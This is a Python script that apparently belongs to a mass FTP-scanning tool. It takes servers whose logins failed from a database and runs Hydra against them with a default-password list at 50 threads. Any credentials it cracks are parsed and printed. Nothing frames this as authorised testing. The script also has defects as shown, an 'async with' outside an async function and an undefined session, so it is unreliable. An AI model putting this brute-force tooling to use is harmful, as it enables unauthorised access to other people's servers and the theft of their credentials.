import asyncio
import logging
from sqlalchemy import or_
import argparse
from sqlalchemy.orm import sessionmaker
from sqlalchemy import create_engine
import subprocess

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)
from ftp_db import *
import sys


def save_creds(line):
    print(f"SAVE login info: {line}")
    parts = line.split()
    user_pass = parts[-2].split(':')

    ip = parts[-1]
    username, password = user_pass[0], user_pass[1]
    print(f"{username}:{password}")
    """
    ftp_conn = session.query(FTPConn).filter(FTPConn.ip == ip).first()
    if ftp_conn:
        login_info = session.query(LoginInfo).filter_by(user=username, password=password).first()
        if not login_info:
            login_info = LoginInfo(user=username, password=password)
            login_info.ftp_conns.append(ftp_conn)
            session.add(login_info)
            session.commit()
    hydra_run.links_conns.append(login_info)
    session.add(hydra_run)
    session.commit()
    """


def run_hydra(session, command, C=None, L=None, P=None):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               universal_newlines=True)
    print(f"{command}")
    while True:
        stdout_line = process.stdout.readline()
        stderr_line = process.stderr.readline()
        if stdout_line == '' and stderr_line == '' and process.poll() is not None:
            break
        if stdout_line:
            print(stdout_line.strip())
            if "login:" in stdout_line:
                save_creds(stdout_line)
        if stderr_line:
            print(stderr_line.strip(), file=sys.stderr)

    stdout, stderr = process.communicate()

    print(stdout.strip())
    print(stderr.strip(), file=sys.stderr)
    session.commit()
    return stdout, stderr


def create_M_list(hydra_input_file, ftp_login_failed):
    with open(hydra_input_file, 'w') as f:
        for ftp_conn in ftp_login_failed:
            existing_run = session.query(HydraRun).filter(HydraRun.ftp_id == ftp_conn.id).first()
            if existing_run:
                print(f"{ftp_conn.id} already scanned {existing_run.save_date}", file=sys.stderr)
                continue
            f.write(f"{ftp_conn.ip}\n")


if __name__ == '__main__':
    async with get_session() as session:
        ftp_login_failed = session.query(FTPConn).filter(FTPConn.error.like('%Login Incorrect%')).all()

        hydra_input_file = './input/ftp_targets.txt'
        C = './input/ftp-betterdefaultpasslist.txt'
        create_M_list(hydra_input_file, ftp_login_failed)

        hydra_command = f"hydra -I -M {hydra_input_file} -C {C} ftp -V -t 50"

        run_hydra(session=session, command=hydra_command, C=C)
